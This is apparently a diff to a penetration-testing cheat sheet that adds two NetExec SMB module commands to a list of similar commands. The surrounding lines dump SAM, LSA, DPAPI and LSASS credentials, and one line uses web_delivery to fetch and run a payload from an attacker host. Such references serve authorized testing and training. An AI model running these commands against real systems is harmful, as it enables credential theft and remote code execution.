@@ -643,6 +643,8 @@ $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --sam
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --lsa
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --dpapi
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wcc
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M snipped
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M web_delivery -o URL=http://<LHOST>/<FILE>
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin
